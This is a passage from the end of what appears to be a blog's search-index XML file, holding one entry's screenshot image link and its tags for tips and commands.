<p><img src="https://gitee.com/t_mouse/BlogPics/raw/master/uPic/Images/2020-04-19-20-%E6%88%AA%E5%B1%8F2020-04-19%2020.37.06-GX4PF5.png" alt></p>
]]></content>
      <tags>
        <tag>技巧</tag>
        <tag>Command</tag>
      </tags>
  </entry>
</search>
